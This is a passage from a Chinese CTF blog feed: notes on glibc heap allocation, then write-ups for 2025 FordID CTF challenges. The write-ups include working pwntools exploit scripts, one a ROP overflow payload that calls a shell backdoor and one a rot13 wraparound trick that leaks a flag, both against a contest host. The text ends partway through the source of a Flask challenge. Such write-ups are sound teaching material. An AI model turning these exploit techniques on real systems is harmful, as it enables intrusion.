。如果非空，则立即取出链表头块，并返回该块 。这一步是不需锁定全局链表的快速路径。</li><li><strong>Small Bin 路径</strong>：如果 nb 属于小块范围（in_smallbin_range(nb) 为真），计算其小块索引 idx&#x3D;smallbin_index(nb) 。如果对应 Small Bin 的链表非空，就直接取出链表尾（last(bin)）的块作为分配结果 ，并把该块从链表中摘除。取出后需设置 PREV_INUSE 位，并标记为已分配块。</li><li><strong>Fastbin 合并</strong>：如果以上未成功且当前请求较大，检查 av-&gt;have_fastchunks 标志。如果 fastbin 链表有待处理的块（来自之前的释放），则调用 malloc_consolidate(av)，将所有 Fastbin 中的块全部合并并转入 Unsorted bin 。这样可以避免以后碎片累积。然后恢复刚才判断 idx（因为可能影响后续 Small&#x2F;Large 路径）。</li><li><strong>Unsorted Bin 处理</strong>：现在检查 Unsorted Bin（对应 bins[1]） 。对于 Unsorted Bin 中的每个块，逐个检查是否符合请求：<ul><li>若某个块大小正好等于 nb，则立即用它（并从 Unsorted 链表摘除返回） 。</li><li>若是小请求且 Unsorted Bin 中仅余最后一个块 last_remainder，且它足够大，允许切分，就用它的一部分：将前 nb 字节分配给用户，剩余部分作为新的 Unsorted Bin 块 。</li><li>否则（当前块不正好合适），将该块从 Unsorted Bin 摘除并插入到其<strong>正确的大小 Bin</strong>中：如果其大小仍在小块范围，则入小块链；否则按其大小计算大块索引插入大块链中（并保持链表大小排序） 。这种做法保证每个块在被 malloc 再次利用前至少在 Unsorted Bin 暂留一次 。</li></ul></li><li><strong>Large Bin 路径</strong>：如果请求属于大块范围（!in_smallbin_range(nb)）且上一步未分配到块，则查找大块链中最适合的块。首先在计算得到的目标大块链中查找第一个尺寸 ≥ nb 的块，利用 fd_nextsize 跳表加速。若找到，则将其摘出：如果剩余不足一个最小块，则直接用整块；否则同样分裂出一个余块，将余块重新插入 Unsorted Bin 。</li><li><strong>遍历所有 Bin</strong>：若仍未找到合适块，则从下一个 Bin 开始（索引+1），根据 BinMap 位图迅速跳过空链表，线性扫描剩余大小的所有 Bin，寻找第一个非空链表中的适合块 。找到后同样摘出并分配（必要时切分、余块入 Unsorted）。</li><li><strong>使用 Top Chunk</strong>：如果以上所有 Bin 都没有可用块，最后尝试使用 av-&gt;top（Arena 的顶端空闲块）。如果 top-&gt;size &gt;&#x3D; nb + MINSIZE，则将 top 切分出一个前部给请求（设置为已分配），剩下部分仍作新 top 。</li><li><strong>系统扩展</strong>：若 top 也不足，或者 top 刚好被耗尽（空间小于 MINSIZE），则调用 sysmalloc(nb, av) 扩展堆空间 。sysmalloc 通常通过 sbrk&#x2F;morecore 增加一段连续内存（根据页大小对齐），并可能触发透明大页优化 。如果 sbrk 失败或请求很大超出阈值，则备用地使用 mmap 分配一段新的内存区域。新分配的区域会被标记为 mmapped chunk，后续释放时会 munmap。</li><li><strong>返回</strong>：最后，将分配到的块首地址（跳过 chunk 头部）返回给用户。整个过程中会设置合适的标志位（PREV_INUSE、Arena 标识等），并在必要时检查内部一致性（调试模式下）。</li></ol><h2 id="释放内存块"><a href="#释放内存块" class="headerlink" title="释放内存块"></a>释放内存块</h2><p>和申请内存块差不多，这里就不进行详细的源码分析了，只梳理大概的逻辑～</p><p>先检查是否有自定义的钩子函数，如果有就用用户自定义的。没有就进入默认的 <code>_int_free</code> 函数。再进入之前还会做一些操作和检查，包括：如果释放内存为0，直接返回。如果这个内存时 <code>mmap</code> 得到的，则释放 <code>mmap</code> 得到的内存。</p><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a><code>_int_free</code></h3><p>自定义一些变量，检查都合格之后。判断当前的 bin 是否在 <code>fast bin</code> 的范围内，在的话就插入到 <code>fastbin</code> 的头部，即成为对应 <code>fastbin</code> 链表的第一个 <code>free chunk</code> 。</p><p>注意：只有不是 <code>fast bin</code> 的情况下才会触发 <code>unlink</code> 。</p><p>为了避免 <code>heap</code> 中有太多零零碎碎的内存块，会对 <code>chunk</code> 进行合并，合并之后可以用来应对更大的内存块请求。合并的主要顺序为：</p><ul><li>先考虑物理低地址空闲块</li><li>后考虑物理高地址空闲块。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 FordID CTF</title>
    <link href="/2025/09/14/2025-FordID-CTF/"/>
    <url>/2025/09/14/2025-FordID-CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn（附件：handout-2）"><a href="#pwn（附件：handout-2）" class="headerlink" title="pwn（附件：handout 2）"></a>pwn（附件：handout 2）</h1><p>Stumbled upon Rust recently, still learning the ropes…</p><p>看下程序，是用 <code>rust</code> 语言写的</p><span id="more"></span><p>64位程序，啥保护没开，简单的ROP，泄露下基址打 <code>libc</code> 然后 <code>system(&#39;/bin/sh&#39;)</code> 。</p><p><img src="/images/2025-FordID-CTF.png" alt="img"></p><p>好吧有后门函数，不用打 <code>libc</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.update(arch = <span class="hljs-string">&quot;amd64&quot;</span>, os = <span class="hljs-string">&quot;Linux&quot;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br><br>url = <span class="hljs-string">&quot;0.cloud.chals.io:31984&quot;</span><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, <span class="hljs-built_in">int</span>(POST))<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="hljs-comment"># puts_plt = elf.plt[&#x27;puts&#x27;]</span><br>pop_rdi_ret = <span class="hljs-number">0x23c5ba</span><br>ret = <span class="hljs-number">0x23c334</span><br><span class="hljs-comment"># read_got = elf.got[&#x27;read&#x27;]</span><br><span class="hljs-comment"># vuln = 0x23C520</span><br><span class="hljs-comment"># dbg(&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># b main</span><br><span class="hljs-comment"># &#x27;&#x27;&#x27;)</span><br>win = <span class="hljs-number">0x23C4E0</span><br>bin_sh = <span class="hljs-number">0x2032E0</span><br><br>ru(<span class="hljs-string">b&#x27;Say something:\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span> + p64(pop_rdi_ret) + p64(<span class="hljs-number">0xDEADBEEFCAFEBABE</span>) + p64(ret) + p64(win)<br>sl(payload)<br>ia()<br></code></pre></td></tr></table></figure><h1 id="Protect-the-environment"><a href="#Protect-the-environment" class="headerlink" title="Protect the environment"></a>Protect the environment</h1><p>开了 <code>canary</code> 和 <code>pie</code> 保护</p><p>先看程序里面哪里可能会有漏洞。源码自己写了一个函数： <code>rot13</code> 返回值是一个地址。应该问题就出现在这儿了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">rot13</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span> &#123;<br>  <span class="hljs-keyword">while</span> (*s != <span class="hljs-number">0</span>) &#123;<br>    *s += <span class="hljs-number">13</span>;<br>    s++;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-type">char</span> command[<span class="hljs-number">64</span>];<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%63s %63s&quot;</span>, command, name);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;protect&quot;</span>)) &#123;<br>      <span class="hljs-type">char</span> *val = getenv(name);<br>      <span class="hljs-keyword">if</span> (val) &#123;<br>        rot13(val);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Protected %s\n&quot;</span>, name);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such environment variable\n&quot;</span>);<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(command, <span class="hljs-string">&quot;print&quot;</span>)) &#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(name, <span class="hljs-string">&quot;FLAG&quot;</span>)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access denied\n&quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">char</span> *val = getenv(name);<br>        <span class="hljs-keyword">if</span> (val) &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s=%s\n&quot;</span>, name, val);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No such environment variable\n&quot;</span>);<br>        &#125;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Unknown command\n&quot;</span>);<br>      <span class="hljs-keyword">break</span> ;<br>    &#125;<br>  &#125; <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先把这个可执行程序的相关动态链接器和链接库给改了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">patchelf --set-interpreter /home/spongebob/Document/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so pwn<br>patchelf --replace-needed libc.so.6 ~/Document/pwn/protect_our_env/libc-2.27.so  pwn<br></code></pre></td></tr></table></figure><p>运行大概分为两种：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; protect<br>PATH<br>Protected PATH<br>&gt; ^C<br>spongebob@spongebob:~/Document/pwn/protect_our_env$ ./pwn<br>&gt; <span class="hljs-built_in">print</span><br>PATH<br>PATH=/home/spongebob/.local/bin:/home/spongebob/.vscode-server/cli/servers/Stable-f220831ea2d946c0dcb0f3eaa480eb435a2c1260/server/bin/remote-cli:/home/spongebob/.cargo/bin:/home/spongebob/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/usr/local/musl/bin/:/usr/local/musl/bin/<br>&gt; ^C<br></code></pre></td></tr></table></figure><p>一个是保护环境变量，然后把这个地址处的环境变量对应的 <code>value</code> 给修改了（用 <code>rot13</code> ）</p><p>另一个是打印环境变量信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; protect<br>PATH<br>Protected PATH<br>&gt; <span class="hljs-built_in">print</span><br>PATH<br>PATH=&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;y|pny&lt;ov&#123;G&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;p|qr:rr&lt;pyv&lt;rr&lt;`noyr:s??=E@&gt;rn?qFACp=qpo=s@rnnAE=roA@Bn?p&gt;?C=&lt;rr&lt;ov&#123;&lt;rz|r:pyvG&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;pnt|&lt;ov&#123;G&lt;u|zr&lt;&#125;|&#123;tro|o&lt;;y|pny&lt;ov&#123;G&lt;&lt;<span class="hljs-string">y|pny&lt;ov&#123;G&lt;&lt;y</span>|pny&lt;ov&#123;G&lt;&lt;<span class="hljs-string">ov&#123;G&lt;&lt;ov</span>&#123;G&lt;ov&#123;G&lt;ov&#123;G&lt;&lt;<span class="hljs-string">tnzrG&lt;&lt;y|pny&lt;tnzrG</span>&lt;&#123;n&#125;&lt;ov&#123;G&lt;&lt;<span class="hljs-string">y|pny&lt;zy&lt;ov&#123;&lt;G&lt;&lt;y</span>|pny&lt;zy&lt;ov&#123;&lt;<br></code></pre></td></tr></table></figure><p>应该是写入环境变量相关进行修改，但这方面还没了解过。</p><p>[BUUCTF-pwn]——wdb2018_guess (environ环境变量) 是一道类似的题目</p><p>在Linux C中，environ是一个全局变量，它储存着系统的环境变量。</p><p>它储存在libc中，因此environ是沟通libc地址与栈地址的桥梁。</p><p>好吧整个方向都错了～</p><p>由于 <code>flag</code> 格式都为 <code>FordID&#123;...&#125;</code> ，所以关于 <code>FLAG</code> 环境变量内容应该为：<br>       <code>FLAG=FordID&#123;...&#125;</code></p><p>既然直接 <code>print FLAG</code> 不行，可以通过不断的 <code>protect</code> ，然后将内容中的 <code>F</code> 改为 <code>=</code> ，然后进行： <code>print FLAG=</code> 就行了。</p><p>如何将 <code>F</code> 改为 <code>=</code> 呢？由于源码中:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">rot13</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span> &#123;<br>  <span class="hljs-keyword">while</span> (*s != <span class="hljs-number">0</span>) &#123;<br>    *s += <span class="hljs-number">13</span>;<br>    s++;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对字符指针不断进行加会有什么溢出效果，应该是高位溢出不管，一个字节溢出相当于 <code>%256</code> 。调试看一下，如下图所示：</p><p><img src="/images/2025_FordID-ctf2.png" alt="image.png"></p><p>所以只需要算出多少轮能从 <code>F</code> 变成 <code>=</code> 就行了。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.update(arch = <span class="hljs-string">&quot;amd64&quot;</span>, os = <span class="hljs-string">&quot;Linux&quot;</span>)<br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br><span class="hljs-comment"># Local = True</span><br>Local = <span class="hljs-literal">False</span><br><br>url = <span class="hljs-string">&quot;0.cloud.chals.io:33121&quot;</span><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, <span class="hljs-built_in">int</span>(POST))<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>io = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>env_value = &#123;&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_env_value</span>(<span class="hljs-params">env_name</span>):<br>    ru(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    payload = <span class="hljs-string">&quot;print &quot;</span> + env_name<br>    sl(payload.encode())<br>    data = rl().decode()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;No&quot;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span><br>    data = data.split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>]<br>    env_value[env_name] = data<br><br>env = [<span class="hljs-string">&quot;PATH&quot;</span>,<span class="hljs-string">&quot;HOME&quot;</span>,<span class="hljs-string">&quot;LANG&quot;</span>,<span class="hljs-string">&quot;SHELL&quot;</span>,<span class="hljs-string">&quot;USER&quot;</span>,<span class="hljs-string">&quot;PWD&quot;</span>,<span class="hljs-string">&quot;LOGNAME&quot;</span>,<span class="hljs-string">&quot;TZ&quot;</span>,<span class="hljs-string">&quot;TERM&quot;</span>,<span class="hljs-string">&quot;LC_ALL&quot;</span>,<span class="hljs-string">&quot;LD_LIBRARY_PATH&quot;</span>]<br><span class="hljs-keyword">for</span> env_name <span class="hljs-keyword">in</span> env:<br>    test_env_value(env_name)<br><br><span class="hljs-built_in">print</span>(env_value)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;F&#x27;</span>) + i * <span class="hljs-number">13</span>) % <span class="hljs-number">256</span>) == <span class="hljs-string">&#x27;=&#x27;</span>:<br>num = i<br><span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):<br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&quot;protect FLAG&quot;</span>)<br>    rl()<br><br>sla(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&quot;print FLAG=&quot;</span>)<br>data = rl().decode()<br>data = data.split(<span class="hljs-string">&#x27;G=&#x27;</span>)[<span class="hljs-number">1</span>]<br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> data:<br>    result += <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(ch) - <span class="hljs-number">13</span> * <span class="hljs-number">19</span>) % <span class="hljs-number">256</span>)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h1 id="Meta-2-0"><a href="#Meta-2-0" class="headerlink" title="Meta 2.0"></a>Meta 2.0</h1><p>这个题给出的 <a href="http://app.py/"><code>app.py</code></a> 内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pathlib<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, abort, jsonify, render_template, request<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename<br><span class="hljs-keyword">import</span> magic<br><br>app = Flask(__name__)<br>TMP_PARENT = pathlib.Path(<span class="hljs-string">&quot;/tmp/metabox&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">cmd, cwd=<span class="hljs-literal">None</span>, timeout=<span class="hljs-number">20</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Return (stdout, stderr, exit_code).&quot;&quot;&quot;</span><br>    proc = subprocess.run(<br>        cmd,<br>        cwd=cwd,<br>        stdout=subprocess.PIPE,<br>        stderr=subprocess.PIPE,<br>        text=<span class="hljs-literal">True</span>,<br>        timeout=timeout,<br>        env=os.environ,<br>    )<br>    <span class="hljs-keyword">return</span> proc.stdout, proc.stderr, proc.returncode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_pdf</span>(<span class="hljs-params">file_path: pathlib.Path</span>):<br>    stdout, _stderr, code = run([<span class="hljs-string">&quot;pdfinfo&quot;</span>, <span class="hljs-built_in">str</span>(file_path)])<br>    <span class="hljs-keyword">if</span> code != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;pdfinfo failed&quot;</span>&#125;, <span class="hljs-number">415</span><br><br>    meta = &#123;&#125;<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> stdout.splitlines():<br>        <span class="hljs-keyword">if</span> <span 